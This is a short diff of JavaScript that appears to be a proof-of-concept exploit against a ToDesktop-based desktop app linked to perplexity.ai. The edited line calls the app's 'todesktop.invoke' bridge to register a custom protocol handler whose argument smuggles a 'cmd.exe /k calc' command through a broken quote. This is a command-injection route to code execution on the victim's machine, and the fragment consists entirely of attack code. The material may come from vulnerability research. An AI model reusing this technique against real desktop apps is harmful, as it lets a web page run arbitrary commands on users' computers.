@@ -9,7 +9,7 @@ document.body.appendChild(x);
 };
 if (window.todesktop){
   setTimeout(function(){
-nw.todesktop.invoke({metadata:{invoke:{version:'1.1.1'}},payload:{command:{namespace:"app",method:"setAsDefaultProtocolClient",property:"z",eventName:"",args:['customprotocol1','c:\\windows\\system32\\cmd.exe" /k calc"']}}}).then(frame1());
+todesktop.invoke({metadata:{invoke:{version:'1.1.1'}},payload:{command:{namespace:"app",method:"setAsDefaultProtocolClient",property:"z",eventName:"",args:['customprotocol1','c:\\windows\\system32\\cmd.exe" /k calc"']}}}).then(frame1());
 },'3000');
 } else {
 var nw = open('https://perplexity.ai');
